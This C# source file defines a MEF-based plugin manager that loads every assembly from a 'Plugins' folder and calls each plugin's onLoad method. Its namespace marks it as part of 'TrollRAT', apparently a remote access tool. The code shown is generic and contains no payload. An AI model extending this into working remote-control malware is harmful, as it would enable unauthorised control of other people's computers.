using System.ComponentModel.Composition;
using System.ComponentModel.Composition.Hosting;

namespace TrollRAT.Plugins
{
    internal class PluginManager
    {
        [ImportMany(typeof(ITrollRATPlugin))]
        internal ITrollRATPlugin[] plugins = null;

        internal void loadPlugins()
        {
            var catalog = new DirectoryCatalog("Plugins");
            var container = new CompositionContainer(catalog);
            container.ComposeParts(this);

            foreach (ITrollRATPlugin plugin in plugins)
                plugin.onLoad();
        }
    }
}
